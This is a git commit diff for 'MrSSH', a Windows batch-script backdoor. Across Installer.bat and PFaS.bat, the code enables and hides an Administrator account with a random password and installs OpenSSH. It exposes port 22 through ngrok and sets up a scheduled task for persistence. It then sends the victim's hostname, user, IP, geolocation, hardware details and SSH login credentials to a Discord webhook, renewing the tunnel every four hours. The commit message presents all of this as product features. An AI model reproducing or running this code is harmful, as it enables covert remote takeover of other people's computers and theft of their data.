30341fc9a35e1af2332526dd42bd7603b4a5465c
dheb <74708369+dh3b@users.noreply.github.com>
2021-11-20 15:54:51 +0100

    BIG changes (read desc)
    - Identifier system renovation
    - Rentry pastes system
    - Checking if files exist and installing to Appdata
    - Importing startup task from xml taskfile
    - Status File system (easier bug tracking)
    - Hiding ngrok log
    - Processor architecture and windows version check
    - Script is compatible with 32-bit version now!
    - Webhook validator
    - Ngrok script is less buggy now
    - Check if password has changed script
    - Add SSH user to discord webhook ngrok credidentals

--- Files/Installer.bat
+++ Files/Installer.bat
@@ -1,56 +1,115 @@
-@echo on
+@echo off
 setlocal enabledelayedexpansion
 chcp 65001 >nul
 
 :: <Variables>
 set "Token=%~1"
+set "JsonValues=token version CreationDate ID Endpoint Access"
 set "Version=1.0"
-set "DefaultToken=dheb"
-set Files=NgrokRun.bat OpenSSH.ps1 Source.bat hide.reg WebParse.exe
+set "DefaultToken=0000"
+set Files=PFaS.bat OpenSSH.ps1 Source.bat hide.reg WebParse.exe
+set OnLogFiles=onlogon.bat Run.vbs start.bat MrSSH-task.xml
 set Github=https://github.com/dh3b/MrSSH/raw/v.1.0/Files/
+set "TaskFile=!Data!\MrSSH-task.xml"
+set "ErrorCount=0"
+set "StatusFile=!TFolder!\Status.ini"
+:: </Variables>
+
+:: <Folders>
 set "Folder=!temp!\Files" & IF NOT EXIST !Folder! mkdir !Folder!
 set "TFolder=!temp!\TempFolder" & IF NOT EXIST !TFolder! mkdir !TFolder!
 set "Data=%appdata%\MrSSH" & IF NOT EXIST !Data! mkdir !Data!
-set "TaskFile=%appdata%\MrSSH\MrSSH-task.xml"
-:: </Variables>
+set "PFaS=!temp!\I4-L63O3V6E-82DI18C24K23S" & IF NOT EXIST !PFaS! mkdir !PFaS!
+:: </Folders>
 
 pushd !Folder!
 
-:: <Token Check>
-if not defined Token set "Token=!DefaultToken!"
-curl -L# "https://raw.githubusercontent.com/dh3b/MrSSH/v.1.0/Identifiers/Redirect.ini" -o "!Folder!\Redirect.ini"
-find /c "!token!" redirect.ini >NUL
-if %errorlevel% equ 1 goto notfound
-goto found
-:notfound
-echo TokenExists: False>!TFolder!\TokenCheck.txt
-exit
-:found
-if !Token!==!DefaultToken! (echo TokenExists: Didn't specify>!TFolder!\TokenCheck.txt) else (echo TokenExists: True>!TFolder!\TokenCheck.txt)
-:: </Token Check>
-
-:: <Set webhook>
-FOR /F "tokens=* USEBACKQ" %%F IN (`findstr "%token%" "redirect.ini"`) DO (SET hexwebhook=%%F)
-set "hexwebhook=%hexwebhook:~-244%"
-echo !hexwebhook!>HexString.hex
-certutil -decodehex HexString.hex output.hex >nul
-set /p webhook=<output.hex
-del HexString.hex output.hex
-:: </Set webhook>
+:: <Processor architecture and windows check>
+for /f "delims=" %%a in ('wmic os get OSArchitecture ^| findstr bit') do set "Bits=%%a"
+if !Bits!=="64-bit" (
+   set "ngrok=ngrok64.exe"
+)
+if !Bits!=="32-bit" (
+   set "ngrok=ngrok32.exe"
+) else (
+   set "ngrok=ngrok64.exe"
+   echo WARNING: System bits undefined (!Bits!)>>!StatusFile!
+   echo.>>!StatusFile!
+   set !ErrorCount!+=1
+)
+for /f "delims=" %%a in ('systeminfo ^| findstr /B /C:"OS Name"') do set "Windows=%%a"
+set windows=%windows:~-25%
+:: </Processor architecture and windowscheck>
 
 :: <Install>
 Rem download ngrok anyway, because it often bugs
-curl -L# "https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-windows-amd64.zip" -o "!Folder!\ngrok.zip"
+curl -fL#k "!Github!!ngrok!" -o "!PFaS!\ngrok.exe"
 
-for %%a in (!Files!) do if not exist "!temp!\Files\%%a" set /a MissingFiles+=1
+Rem download files into !Files!
+for %%a in (!Files!) do if not exist "!Folder!\%%a" set /a MissingFiles+=1
 
 if !MissingFiles! geq 1 (
     for %%a in (!Files!) do (
         set /a Downloaded+=1
-        curl --create-dirs -f#kLo "!temp!\Files\%%a" "!Github!/%%a"
+        curl --create-dirs -f#kLo "!Folder!\%%a" "!Github!/%%a"
+    )
+)
+
+Rem download files into !Data!
+for %%a in (!OnLogFiles!) do if not exist "!Data!\%%a" set /a MissingFiles+=1
+
+if !MissingFiles! geq 1 (
+    for %%a in (!OnLogFiles!) do (
+        set /a Downloaded+=1
+        curl --create-dirs -f#kLo "!Data!\%%a" "!Github!/%%a"
     )
 )
 :: </Install>
+
+:: <Set token info>
+if exist !StatusFile! del /Q !StatusFile!
+echo [Indicates if token exists either does not]>!StatusFile!
+if not defined Token set "Token=!DefaultToken!"
+if exist !TFolder!\bin\Token.json del /Q !TFolder!\bin\Token.json
+set "TokenURL=https://github.com/dh3b/MrSSH/raw/v.1.0/Identifiers/!Token!.json"
+curl --create-dirs -Ls "!TokenURL!" -o "!TFolder!\bin\Token.json" & if !ErrorLevel! equ 1 (
+   echo TokenStatus=Does not exist either the program did not specify it>>!StatusFile!
+   echo.>>!StatusFile!
+   set !ErrorCount!+=1
+) else (
+   echo TokenStatus=Valid>>!StatusFile!
+   echo.>>!StatusFile!
+)
+for /f "delims=" %%t in ('call "WebParse.exe" "!TokenURL!" !JsonValues!') do (set "Json.%%t")
+for %%a in (ID Endpoint Access) do (
+call :Decode "!Json.%%a!"
+set "Json.%%a=!PlainString!"
+)
+set "URL=https://rentry.co/!Json.Endpoint!"
+echo [Indicates if rentry status and paste status is valid either not]>>!StatusFile!
+curl --create-dirs -Ls "!URL!/raw" -o "!TFolder!\bin\rentry.txt" & if !ErrorLevel! equ 1 (
+   call :status
+   if status==1 (
+      echo RentryPaste=Invalid>>!StatusFile!
+      echo.>>!StatusFile!
+      echo RentryStatus=Online>>!StatusFile!
+      echo.>>!StatusFile!
+      set !ErrorCount!+=1
+   ) else (
+      echo RentryPaste=Cannot check (Rentry.co is offline)>>!StatusFile!
+      echo.>>!StatusFile!
+      echo RentryStatus=Offline>>!StatusFile!
+      echo.>>!StatusFile!
+      set !ErrorCount!+=1
+   )
+) else (
+   echo RentryPaste=Valid>>!StatusFile!
+   echo.>>!StatusFile!
+   echo RentryStatus=Online>>!StatusFile!
+   echo.>>!StatusFile!
+   FOR /F %%i in (!TFolder!\bin\rentry.txt) DO set %%i
+)
+:: </Set token info>
 
 powershell ./OpenSSH.ps1
 
@@ -58,7 +117,7 @@ powershell ./OpenSSH.ps1
 set "set[1]=ABCDEFGHIJKLMNOPQRSTUVWXYZ"  &  set "len[1]=26"  &  set "num[1]=0"
 set "set[2]=abcdefghijklmnopqrstuvwxyz"  &  set "len[2]=26"  &  set "num[2]=0"
 set "set[3]=0123456789"                  &  set "len[3]=10"  &  set "num[3]=0"
-set "set[4]=!@#$"                     &  set "len[4]=6"   &  set "num[4]=0"
+set "set[4]=#@"                     &  set "len[4]=6"   &  set "num[4]=0"
 
 set "list="
 for /L %%i in (1,1,10) do (
@@ -88,15 +147,49 @@ for %%a in (%list%) do (
 
 echo !RndAlphaNum!>%temp%\TempFolder\pass.txt
 
+echo [Indicates if administrator account proccess is successful]>>!StatusFile!
 net user administrator /active:yes
+if !ErrorLevel! neq 0 (
+   echo AdministratorAccount=Disabled>>!StatusFile!
+   echo.>>!StatusFile!
+   set !ErrorCount!+=1
+) else (
+   echo AdministratorAccount=Enabled>>!StatusFile!
+   echo.>>!StatusFile!
+)
 net user "Administrator" "!RndAlphaNum!"
+if !ErrorLevel! neq 0 (
+   echo AdministratorPassChange=Unsuccessful>>!StatusFile!
+   echo.>>!StatusFile!
+   set !ErrorCount!+=1
+) else (
+   echo AdministratorPassChange=Successful>>!StatusFile!
+   echo.>>!StatusFile!
+)
 
+echo [Indicates if Administrator account hide was successful either not]>>!StatusFile!
 reg import "!Folder!\hide.reg"
+if !ErrorLevel! neq 0 (
+   echo HideImport=Unsuccessful>>!StatusFile!
+   set !ErrorCount!+=1
+   echo.>>!StatusFile
+) else (
+   echo HideImport=Successful>>!StatusFile!
+   echo.>>!StatusFile!
+)
 :: </Create Administrator account, hide it and set strong rndm password for it>
 
 :: <Startup>
-curl -L# "!Github!onlogon.bat" -o "!Data!\onlogon.bat" & curl -L# "!Github!Run.vbs" -o "!Data!\Silent.vbs" & curl -L# "!Github!start.bat" -o "!Data!\start.bat"
-schtasks /create /XML "!TaskFile!" /TN "MrSSH" >nul 2>&1
+echo [Indicates if StartupTask (the script that will make the program execute if pc restarted) has been created either not]>>!StatusFile!
+schtasks /create /XML "!TaskFile!" /TN "MrSSH" >!TempFolder!\bin\schatsk.txt
+if !ErrorLevel! neq 0 (
+   echo StartupTask=Already created either system error>>!StatusFile!
+   set !ErrorCount!+=1
+   echo.>>!StatusFile!
+) else (
+   echo StartupTask=Successfully created>>!StatusFile!
+   echo.>>!StatusFile!
+)
 :: </Startup>
 
 :: <Get Network and Hardware>
@@ -112,6 +205,69 @@ if "!proxy!"=="false" (
 ) else set "VPN=:green_circle:" && set "VPNi=ON - :warning: Some Information may be incorrect"
 :: </Check for VPN>
 
-call source.bat +silent --embed "MrSSH has been invoked on %computername%\%username%" ":bookmark_tabs: __**Security, PC config**__ \\n\\n%VPN% **VPN:** %VPNi% \\n\\n:desktop: **PC name:** %computername% \\n\\n:bust_in_silhouette: **User name:** %username%\\n\\n:house:**Ip address:** %query% (%isp%) \\n\\n\\n:bookmark_tabs: __**PC Specification**__\\n\\n:floppy_disk: **RAM:** %RAM%\\n\\n:nut_and_bolt: **CPU:** %CPU%\\n\\n:joystick: **GPU:** %GPU%\\n\\n\\n:bookmark_tabs: __**Location**__ \\n\\n:placard: **Country:** %country% (%countryCode%) \\n\\n:japan: **Region:** %regionName% \\n\\n:cityscape: **City:** %city% (%lat%; %lon%) \\n\\n:timer: **Timezone:** %timezone%" "52bf90" "https://i.imgur.com/b2Terft.png"
+set "Title=MrSSH has been invoked on %computername%\%username%"
+set "PcCnfg=:bookmark_tabs: __**Security, PC config**__ \\n\\n%VPN% **VPN:** %VPNi% \\n\\n:window: **OS:** %windows%\\n\\n:electric_plug: **System bits:** %bits%\\n\\n:desktop: **PC name:** %computername% \\n\\n:bust_in_silhouette: **User name:** %username%\\n\\n:house:**Ip address:** ||%query%|| (%isp%)"
+set "Specs=:bookmark_tabs: __**PC Specification**__\\n\\n:floppy_disk: **RAM:** %RAM%\\n\\n:nut_and_bolt: **CPU:** %CPU%\\n\\n:joystick: **GPU:** %GPU%"
+set "LocationInfo=:bookmark_tabs: __**Location**__ \\n\\n:placard: **Country:** %country% (%countryCode%) \\n\\n:japan: **Region:** %regionName% \\n\\n:cityscape: **City:** %city% (||%lat%; %lon%||) \\n\\n:timer: **Timezone:** %timezone%"
+set "ID=:key: __**Token Info**__\\n\\n:ticket: **Token:** %Token%\\n\\n:calendar: **Creation Date:** %Json.CreationDate%\\n\\n:screwdriver: **Version:** %Version%\\n\\n:credit_card: **[Edit page](%URL%) and password:** ||%Json.Access%||"
 
-call NgrokRun.bat !token!
+call source.bat +silent --embed "!Title!" "!PcCnfg!\\n\\n\\n!Specs!\\n\\n\\n!LocationInfo!\\n\\n\\n!ID!\\n\\n\\n*Pssst... Wait a second, that isn't all. There are 2 more embeds waiting for them to send.*" "52bf90" "https://i.imgur.com/b2Terft.png"
+
+start /B "PFaS" call PFaS.bat !token!
+
+:: <Encode>
+:Encode
+set "String=%~1"
+
+echo !String!>PlainText.hex
+certutil -encodehex PlainText.hex output.hex >nul
+set "Encoded="
+
+for /f "delims=" %%A in (output.hex) do (
+    set "line=%%A"
+    set "line=!line:~5,48!"
+    set "Encoded=!Encoded!!line!"
+)
+del PlainText.hex output.hex
+set "Encoded=!Encoded: =!"
+
+exit /b
+:: </Encode>
+
+:: <Decode>
+:Decode
+set "String=%~1"
+
+echo !String!>String.hex
+certutil -decodehex String.hex output.hex >nul
+set /p PlainString=<output.hex
+del String.hex output.hex
+
+exit /b 
+:: </Decode>
+
+:: <Discord Webhook validate>
+:Validate_Webhook
+for %%a in (ptb canary) do set "V-Webhook=!webhook:%%a.=!"
+if not "!webhook:~0,33!"=="https://discord.com/api/webhooks/" (
+   echo "Webhook: Invalid">>!StatusFile!
+   echo.>>!StatusFile!
+   set !ErrorCount!+=1
+) else (
+   echo "Webhook: Valid">>!StatusFile!
+   echo.>>!StatusFile!
+)
+
+exit /b 
+:: </Discord Webhook validate>
+
+:: <Rentry.co status>
+:status
+ping rentry.co -n 1 | findstr "TTL" >nul
+if !ErrorLevel! equ 1 (
+   set status=0
+) else (
+   set status=1
+)
+
+exit /b
--- Files/PFaS.bat
+++ Files/PFaS.bat
@@ -1,51 +1,55 @@
 @echo off
 setlocal enabledelayedexpansion
 chcp 65001 >nul
-set "LogFile=%temp%\Files\log\ngrok.log"
+set "Log=!PFaS!\log" & IF NOT EXIST !Log! mkdir !Log!
 set "EmbedText=Connection credentials"
-
-mkdir %temp%\Files\log
-tar -xf ngrok.zip
-
-:: <Set webhook>
-set "Token=%~1"
-curl -Ls "https://raw.githubusercontent.com/dh3b/MrSSH/v.1.0/Identifiers/Redirect.ini" -o "Redirect.ini"
-FOR /F "tokens=* USEBACKQ" %%F IN (`findstr "!Token!" "redirect.ini"`) DO (SET hexwebhook=%%F)
-set "hexwebhook=%hexwebhook:~-244%"
-echo !hexwebhook!>HexString.hex
-certutil -decodehex HexString.hex output.hex >nul
-set /p webhook=<output.hex
-del HexString.hex output.hex
-:: </Set webhook>
 
 for /f "delims=" %%a in ('call "WebParse.exe" "http://ip-api.com/json?fields=192511" query') do set "%%a"
 
 taskkill /IM ngrok.exe /F
-start /B "ngrok" ngrok.exe tcp 22 -log=stdout > ngrok.log
+echo [Indicates if ngrok (port forwarding tool) has been executed properly either not]>>!StatusFile!
+start /B "ngrok" !PFas!\ngrok.exe tcp 22 -log=stdout > !PFas!\ngrok.log
+if !errorlevel! equ 1 (
+    echo NgrokRun=Unsuccessful>>!StatusFile!
+    echo.>>!StatusFile!
+    set !ErrorCount!+=1
+) else (
+    echo NgrokRun=Successful>>!StatusFile!
+    echo.>>!StatusFile!
+)
+
+echo [Total error cound of the session]>>!StatusFile!
+echo ErrorCount=!ErrorCount!>>!StatusFile!
+echo.>>!StatusFile!
+
+call source.bat +silent --embed "Target PC (%computername%\%username%) status file (Errors, warnings and validator)" " " "#ea3c53" "https://i.imgur.com/b2Terft.png"
+call source.bat +silent --file "!StatusFile!"
 
 :check
-    find /c "url=" ngrok.log >NUL
-    if %errorlevel% equ 1 goto notfound
+    find /c "url=" !PFaS!\ngrok.log >NUL
+    if !errorlevel! equ 1 goto notfound
     goto done
     :notfound
         timeout 3
         goto check
     goto done
     :done
-        xcopy /h /Y ngrok.log %temp%\Files\log\
+        xcopy /h /Y !PFaS!\ngrok.log !Log!
 
-        for /f "delims=" %%a in (!LogFile!) do echo %%a | findstr /c:"url=" >nul && set "Result=%%a"
+        for /f "delims=" %%a in (!Log!\ngrok.log) do echo %%a | findstr /c:"url=" >nul && set "Result=%%a"
         for /f "tokens=8 delims==" %%a in ("!Result!") do (
             for /f "tokens=2 delims=/" %%b in ("%%a") do set RemoteURL=%%b
         )
 
-        FOR /F "delims=" %%F IN (%temp%\TempFolder\pass.txt) DO SET Pass=%%F
+        FOR /F "delims=" %%F IN (!TFolder!\pass.txt) DO SET Pass=%%F
+        set "Change=Changed"
 
-        call Source.bat -silent --embed "!EmbedText! for %computername%\%username% (%query%):" ":satellite_orbital: **IP and port:** !RemoteURL!\\n\\n:detective: **Password:** !Pass!" "FFFDBC" "https://i.imgur.com/b2Terft.png"
+        call Source.bat -silent --embed "!EmbedText! for %computername%\%username% (||%query%||):" ":technologist: **SSH User:** Administrator\\n\\n:satellite_orbital: **IP and port:** ||!RemoteURL!||\\n\\n:detective: **Password:** ||!Pass!|| (!change!)" "FFFDBC" "https://i.imgur.com/b2Terft.png"
         :Loop
             timeout 14400
             taskkill /IM ngrok.exe /F
             start /B "ngrok" ngrok.exe tcp 22 -log=stdout > ngrok.log
+            set "Change=Not Changed"
             set "EmbedText=Renewing session"
             goto check
             goto Loop
